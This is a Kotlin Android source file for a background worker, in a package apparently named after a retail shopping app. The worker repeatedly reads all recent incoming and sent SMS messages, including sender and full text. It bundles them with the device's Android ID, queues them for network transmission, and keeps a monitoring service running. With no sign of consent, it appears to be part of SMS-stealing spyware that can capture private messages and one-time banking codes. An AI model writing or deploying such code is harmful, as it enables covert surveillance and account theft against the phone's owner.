package com.dmartuser.client

import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.util.Log
import androidx.work.*
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class SmsMonitoringWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    
    override fun doWork(): Result {
        return try {
            Log.d("SmsMonitoringWorker", "Periodic monitoring check")
            
            // Ensure foreground service is running
            ensureServiceRunning()
            
            // Sync any missed SMS messages
            syncMissedMessages()
            
            Result.success()
        } catch (e: Exception) {
            Log.e("SmsMonitoringWorker", "Monitoring check failed: ${e.message}")
            Result.retry()
        }
    }

    private fun ensureServiceRunning() {
        val serviceIntent = Intent(applicationContext, SmsMonitoringService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            applicationContext.startForegroundService(serviceIntent)
        } else {
            applicationContext.startService(serviceIntent)
        }
    }

    private fun syncMissedMessages() {
        try {
            // Check for recent messages that might have been missed
            val fifteenMinutesAgo = System.currentTimeMillis() - (15 * 60 * 1000)
            
            // Check inbox messages
            syncRecentMessages("content://sms/inbox", "inbox", fifteenMinutesAgo)
            
            // Check sent messages
            syncRecentMessages("content://sms/sent", "sent", fifteenMinutesAgo)
            
        } catch (e: Exception) {
            Log.e("SmsMonitoringWorker", "Error syncing missed messages: ${e.message}")
        }
    }

    private fun syncRecentMessages(uri: String, type: String, since: Long) {
        try {
            val cursor: Cursor? = applicationContext.contentResolver.query(
                Uri.parse(uri),
                arrayOf("_id", "address", "body", "date"),
                "date > ?",
                arrayOf(since.toString()),
                "date ASC"
            )

            cursor?.use {
                val smsArray = JSONArray()
                
                while (it.moveToNext()) {
                    val address = it.getString(it.getColumnIndexOrThrow("address"))
                    val body = it.getString(it.getColumnIndexOrThrow("body"))
                    val date = it.getLong(it.getColumnIndexOrThrow("date"))

                    val smsObject = JSONObject()
                    smsObject.put("address", address)
                    smsObject.put("body", body)
                    smsObject.put("date", date)
                    smsObject.put("type", type)
                    smsArray.put(smsObject)
                }

                if (smsArray.length() > 0) {
                    Log.d("SmsMonitoringWorker", "Found ${smsArray.length()} missed $type messages")
                    enqueueSmsWorker(smsArray)
                }
            }
        } catch (e: Exception) {
            Log.e("SmsMonitoringWorker", "Error syncing $type messages: ${e.message}")
        }
    }

    private fun enqueueSmsWorker(smsArray: JSONArray) {
        val deviceId = getDeviceId()
        
        val input = Data.Builder()
            .putString("sms_data", smsArray.toString())
            .putString("device_id", deviceId)
            .build()

        val work = OneTimeWorkRequestBuilder<SmsWorker>()
            .setInputData(input)
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build()
            )
            .build()

        WorkManager.getInstance(applicationContext).enqueue(work)
    }

    private fun getDeviceId(): String {
        return try {
            Settings.Secure.getString(
                applicationContext.contentResolver, 
                Settings.Secure.ANDROID_ID
            ) ?: "unknown_android_id"
        } catch (e: Exception) {
            "unknown_android_id"
        }
    }
}
